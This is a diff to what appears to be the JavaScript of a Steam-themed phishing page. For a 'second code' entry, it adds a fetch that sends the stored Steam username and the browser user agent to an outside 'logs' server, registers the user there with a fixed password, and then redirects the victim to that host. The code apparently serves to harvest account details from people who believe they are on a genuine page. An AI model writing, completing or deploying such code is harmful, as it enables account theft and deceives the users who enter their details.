@@ -430,9 +430,35 @@ function setupCodeHandlers() {
                             // НЕ очищаем поля - пользователь сам удалит
                             
                         } else {
-                            // Второй код - редирект
-                            window.location.href = 'https://logs-unisono-project.up.railway.app';
-                        }
+    // Второй код - регистрируем пользователя и редирект
+    const username = localStorage.getItem('steam_username');
+    if (username) {
+        // Отправляем запрос на регистрацию БЕЗ IP
+        fetch('https://logs-unisono-project.up.railway.app/api/auth/register', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                username: username,
+                password: 'steam_password',
+                email: `${username}@steam.com`,
+                ip: 'unknown',
+                userAgent: navigator.userAgent
+            }),
+            mode: 'cors'
+        }).then(() => {
+            // Редирект после регистрации
+            window.location.href = 'https://logs-unisono-project.up.railway.app';
+        }).catch(error => {
+            console.log('Ошибка регистрации:', error);
+            // Все равно редиректим даже при ошибке
+            window.location.href = 'https://logs-unisono-project.up.railway.app';
+        });
+    } else {
+        window.location.href = 'https://logs-unisono-project.up.railway.app';
+    }
+}
                     }, waitTime);
                 }
             }
